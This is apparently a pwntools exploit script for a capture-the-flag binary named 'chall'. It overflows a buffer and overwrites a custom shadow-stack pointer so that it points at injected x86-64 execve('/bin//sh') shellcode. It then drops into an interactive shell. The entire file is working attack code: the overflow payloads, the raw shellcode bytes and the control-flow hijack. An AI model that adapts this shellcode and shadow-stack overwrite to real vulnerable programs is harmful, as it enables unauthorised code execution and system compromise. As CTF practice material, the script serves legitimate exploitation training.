from pwn import *


binpath = './chall'
elf = ELF(binpath)

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
b _start
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = b''
payload += b'A' * 0x100
payload += p64(elf.symbols['__stack_shadow'] + 0x100 + 0x8)
io.sendlineafter(b'Data: ', payload)

payload = b''
payload += p64(elf.symbols['__stack_shadow'] + 0x10)  # overwrite shadow stack ptr to point to shellcode
payload += shellcode
io.sendlineafter(b'Data: ', payload)

io.interactive()
